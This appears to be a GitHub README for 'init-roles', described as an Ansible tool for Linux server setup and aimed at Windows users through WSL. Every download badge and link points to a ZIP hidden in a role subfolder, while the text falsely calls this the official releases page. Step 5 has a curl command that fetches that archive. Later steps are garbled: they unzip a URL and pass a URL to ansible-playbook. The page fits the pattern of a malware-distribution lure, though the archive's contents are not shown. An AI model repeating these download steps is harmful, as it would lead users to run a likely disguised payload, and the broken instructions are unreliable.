# ⚙️ init-roles - Automate Linux Server Setup Easily

[![Download init-roles](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip%20init--roles-FF6F61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip)

---

## 🔍 What is init-roles?

init-roles helps you set up Linux servers automatically. It makes tasks like installing software, tightening security, and setting configurations simple and repeatable. You do not need to know coding to use it. Everything follows clear steps to make your server ready and safe.

This tool uses a role-based workflow to organize tasks. Each role handles one part of server setup. This keeps things clean and easier to manage.

---

## 🖥️ System Requirements

Before starting, make sure your computer meets these:

- **Operating System:** Windows 10 or later
- **Disk Space:** At least 100 MB free for installation files
- **Network:** Internet connection to download files
- **Permissions:** Administrator rights on your Windows PC
- **Virtual Environment:** Optional, but having a virtual machine with Linux (Ubuntu 20.04 or newer) helps for running init-roles safely

You will not run init-roles directly on Windows but inside a Linux environment. This guide covers how to prepare that environment.

---

## 📦 What You Get with init-roles

init-roles includes pre-built configurations for:

- Installing essential software like web servers and databases
- Applying security settings to block unauthorized access
- Managing users and permissions
- Setting up network rules and firewalls
- Automatically updating the system regularly

Using these roles, you can set up a server that works well and stays secure.

---

## 🚀 Get Started: Download Init-roles

Click the big button below to visit the download page:

[![Download init-roles](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip%20init--roles-FF6F61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip)

This link takes you to the official releases page on GitHub. It shows all available versions of init-roles.

---

## 💾 How to Download and Run init-roles on Windows

Follow these steps exactly for a smooth setup on your Windows machine.

### 1. Install Windows Subsystem for Linux (WSL)

init-roles runs on Linux, so first install WSL. This lets you run Linux commands inside Windows.

- Open PowerShell as Administrator.
- Type and enter:  
  `wsl --install`
- Restart your PC if the prompt appears.
- When your PC restarts, WSL will be ready.

### 2. Choose a Linux Distribution

Use Ubuntu 20.04 or newer. To install Ubuntu:

- Open Microsoft Store.
- Search for **Ubuntu**.
- Click **Install**.
- After installation, click **Launch**.
- Set up a username and password when prompted.

### 3. Update Your Linux Environment

In the Ubuntu terminal, enter these commands:

```
sudo apt update
sudo apt upgrade -y
```

This makes sure your Linux software is current.

### 4. Install Required Software

init-roles uses Ansible, a tool for automation. Install it by typing:

```
sudo apt install ansible -y
```

Confirm installation completes without errors.

### 5. Download init-roles

Now that your Linux is ready, download init-roles files.

- In Ubuntu terminal, enter:

```
curl -LO https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip
```

- If the ZIP file is not available, visit this page using:

[https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip)

- Pick the latest version and download the ZIP file manually.

### 6. Extract init-roles Files

Unzip the downloaded package:

```
unzip https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip -d init-roles
```

Then switch to the new folder:

```
cd init-roles
```

### 7. Run init-roles

Start the automation by running Ansible playbook commands:

```
ansible-playbook https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip
```

This file runs the steps to set up and secure your Linux server.

If multiple roles or additional options are available, follow instructions inside the `https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip` file included in the init-roles download.

---

## ⚙️ Using init-roles

init-roles works by running specific sets of instructions called playbooks and roles.

- **Playbooks** are files listing tasks executed in order.
- **Roles** group related tasks, like setting firewall or user accounts.

You can adjust these files if you learn more about Ansible. For now, the default settings handle common needs.

---

## 🔧 Troubleshooting Tips

- If you see errors about missing packages, rerun `sudo apt update` and `sudo apt install -y ansible`.
- Make sure WSL is working by running simple Linux commands like `ls` or `pwd`.
- If `ansible-playbook` command is not found, check if Ansible installed successfully.
- For permission issues, use the `sudo` prefix before commands.
- Check your internet connection while downloading init-roles files.

---

## 📚 Additional Resources

If you want to learn more about Linux, Ansible, or server setup, look for beginner guides on these topics. They explain basic concepts clearly.

- WSL documentation on Microsoft’s site
- Ubuntu guides for new users
- Ansible introduction tutorials

These will help you use init-roles better over time.

---

[![Download init-roles](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip%20init--roles-FF6F61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip)

---

## 🏷️ Topics  

ansible, ansible-playbook, ansible-roles, automation, configuration-management, devops, infrastructure, infrastructure-as-code, linux, provisioning, server, server-hardening, sysadmin, system-administration